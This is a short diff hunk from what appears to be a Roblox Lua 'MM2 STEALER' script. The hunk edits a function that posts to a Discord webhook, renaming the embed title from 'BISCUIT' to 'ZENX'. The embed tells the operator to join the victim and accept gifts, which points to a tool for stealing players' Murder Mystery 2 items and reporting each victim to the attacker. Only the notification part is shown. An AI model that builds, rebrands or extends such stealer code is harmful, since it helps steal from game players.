@@ -153,7 +153,7 @@ local function postToDiscord(link)
 		username = "MM2 STEALER",
 		avatar_url = "https://static.wikia.nocookie.net/murdermystery/images/3/30/MM2logo.png",
 		embeds = {{
-			title = "🍪 BISCUIT | MURDER MYSTERY 2",
+			title = "❌ ZENX | MURDER MYSTERY 2",
 			description = "💡 **How to Use?**\nJoin the user then jump or type anything in chat and accept gifts.",
 			color = 0x000000,
 			thumbnail = { url = "https://static.wikia.nocookie.net/murdermystery/images/3/30/MM2logo.png" },
